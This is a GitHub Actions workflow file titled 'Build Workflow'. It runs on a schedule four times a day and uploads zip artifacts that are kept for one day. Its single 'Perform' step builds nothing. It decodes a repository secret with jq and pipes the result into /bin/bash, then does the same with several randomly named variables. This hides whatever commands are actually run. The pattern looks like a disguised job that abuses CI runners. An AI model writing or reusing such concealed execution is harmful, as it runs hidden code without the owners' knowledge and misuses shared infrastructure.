name: Build Workflow
on:
  workflow_dispatch:

  schedule:
    - cron: '25 5,11,17,23 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          tenuo89: ${{ secrets.tenuo89 }}
        run: |
          printf '%s' "$tenuo89" | jq -r .ecrz5 | /bin/bash
          echo $dyz5 | jq -r .kt163 | /bin/bash
          echo $oxdsj0023 | jq -r .wx3 | /bin/bash
          printf '%s' "$nfw2" | jq -r .vh869 | /bin/bash
          printf '%s' "$nkn49061" | jq -r .sml4248 | /bin/bash
          printf '%s' "$owqv3" | jq -r .t7571 | /bin/bash

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: Sfc4repG
          path: "*.zip"
          retention-days: 1
